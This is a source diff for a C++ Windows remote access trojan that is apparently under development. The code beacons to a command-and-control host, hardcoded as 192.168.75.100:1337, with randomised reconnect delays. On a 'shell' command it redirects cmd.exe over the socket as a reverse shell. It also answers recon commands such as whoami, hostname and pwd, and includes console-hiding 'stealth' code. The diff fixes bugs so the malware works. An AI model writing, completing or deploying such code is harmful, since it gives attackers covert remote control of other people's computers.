@@ -3,6 +3,7 @@
 #include <windows.h>  //Used for WinApi calls
 #include <ws2tcpip.h> //TCP-IP Sockets
 #include <stdio.h>
+#include <time.h>
 
 #include <iostream> //Remove later for space
 
@@ -43,11 +44,42 @@ Notes and Questions:
     - 
 */
 
+//# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+//# ======================================================================================================================================================================================
+//# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+// Functions, individual actions, and commands
+
+void whoami(char *returnval, int returnsize)
+{
+    DWORD bufferlen = 257;
+    GetUserName(returnval, &bufferlen);
+}
+
+void hostname(char *returnval, int returnsize)
+{
+    DWORD bufferlen = 257;
+    GetComputerName(returnval, &bufferlen);
+}
+
+void pwd(char *returnval, int returnsize) // Module 2
+{
+    TCHAR tempvar[MAX_PATH];
+    GetCurrentDirectory(MAX_PATH, tempvar);
+    strcat(returnval, tempvar);
+}
+
+//# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+//# ======================================================================================================================================================================================
+//# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
 void RAT(char* C2_Server, int C2_Port)
 {
+    srand(time(0));
+
     while (true)
     {
-        Sleep((srand(time(0)) % 20) + 5);    // Trys to reconnect every 5-25 seconds
+        Sleep((rand() % 20) + 5);    // Trys to reconnect every 5-25 seconds
 
         SOCKET tcp_sock;
         sockaddr_in addr;
@@ -74,13 +106,13 @@ void RAT(char* C2_Server, int C2_Port)
 
             while (true)
             {
-                int result = recv(tcpsock, CommandReceived, DEFAULT_BUFLEN, 0)
+                int result = recv(tcp_sock, CommandReceived, DEFAULT_BUFLEN, 0);
 
                 std::cout << "Command received: " << CommandReceived;
                 std::cout << "Length of Command received: " << result << std::endl;
 
-                // Should only be used in individual interactive environments
-                if ((strcmp(CommandReceived, "shell") == 0))
+                // Should only be used in individual interactive environments == TBC
+                if ((strcmp(CommandReceived, "shell\n") == 0))
                 {
                     char Process[] = "cmd.exe";
                     STARTUPINFO sinfo;
@@ -89,7 +121,7 @@ void RAT(char* C2_Server, int C2_Port)
                     memset(&sinfo, 0, sizeof(sinfo));
                     sinfo.cb = sizeof(sinfo);
                     sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
-                    sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) mySocket;
+                    sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) tcp_sock;
 
                     CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
 
@@ -97,23 +129,89 @@ void RAT(char* C2_Server, int C2_Port)
                     CloseHandle(pinfo.hProcess);
                     CloseHandle(pinfo.hThread);
 
-                    memset(RecvData, 0, sizeof(RecvData));
-                    
+                    //memset(CommandReceived, 0, sizeof(CommandReceived));
 
-                    int RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN, 0);
-                    if (RecvCode <= 0) {
-                        closesocket(mySocket);
-                        WSACleanup();
-                        continue;
-                    }
-                    if (strcmp(RecvData, "exit\n") == 0) {
-                        exit(0);
-                    }
+                    char buffer[64] = "";
+                    strcat(buffer,"[* Agent-Msg] Exiting shell\n");
+                    send(tcp_sock,buffer,strlen(buffer) + 1, 0);
 
+                    memset(buffer, 0, sizeof(buffer));
+                    memset(CommandReceived, 0, sizeof(CommandReceived));
+
+                    // int RecvCode = recv(tcp_sock, RecvData, DEFAULT_BUFLEN, 0);
+
+                    // if (RecvCode <= 0) {
+                    //     closesocket(mySocket);
+                    //     WSACleanup();
+                    //     continue;
+                    // }
+                    // if (strcmp(RecvData, "EXIT\n") == 0) {
+                    //     continue;
+                    // }
                 }
+                else if ((strcmp(CommandReceived, "whoami") == 0))
+                {
+                    char buffer[257] = "";
+                    whoami(buffer, 257);
+                    strcat(buffer, "\n");
+                    send(tcp_sock, buffer, strlen(buffer) + 1, 0);
+                    memset(buffer, 0, sizeof(buffer));
+                    memset(CommandReceived, 0, sizeof(CommandReceived));
+                }
+                else if ((strcmp(CommandReceived, "hostname") == 0))
+                {
+                    char buffer[257] = "";
+                    hostname(buffer, 257);
+                    strcat(buffer, "\n");
+                    send(tcp_sock, buffer, strlen(buffer) + 1, 0);
+                    memset(buffer, 0, sizeof(buffer));
+                    memset(CommandReceived, 0, sizeof(CommandReceived));
+                }
+                else if ((strcmp(CommandReceived, "pwd") == 0))
+                {
+                    char buffer[257] = "";
+                    pwd(buffer, 257);
+                    strcat(buffer, "\n");
+                    send(tcp_sock, buffer, strlen(buffer) + 1, 0);
+                    memset(buffer, 0, sizeof(buffer));
+                    memset(CommandReceived, 0, sizeof(CommandReceived));
+                }
+                else if ((strcmp(CommandReceived, "exit") == 0))
+                {
+                    closesocket(tcp_sock);
+                    WSACleanup();
+                    exit(0);
+                }
+                // else
+                // {
+
+                // }
+                
             }
         }
-        
     }
+}
+//# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+//# ======================================================================================================================================================================================
+//# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
+
+int main(int argc, char **argv) {
+
+    HWND stealth;                                       //Declare a window handle 
+    AllocConsole();                                     //Allocate a new console
+    stealth=FindWindowA("ConsoleWindowClass",NULL);     //Find the previous Window handler and hide/show the window depending upon the next command
+    ShowWindow(stealth,SW_SHOWNORMAL);                  //SW_SHOWNORMAL = 1 = show, SW_HIDE = 0 = Hide the console
+
+    // FreeConsole();
+    if (argc == 3) {
+        int port  = atoi(argv[2]); 
+        RAT(argv[1], port);
+    }
+    else {
+        char host[] = "192.168.75.100";     // change this to your ip address
+        int port = 1337;                    // change this to your open port
+        RAT(host, port);
+    }
+    return 0;
 }
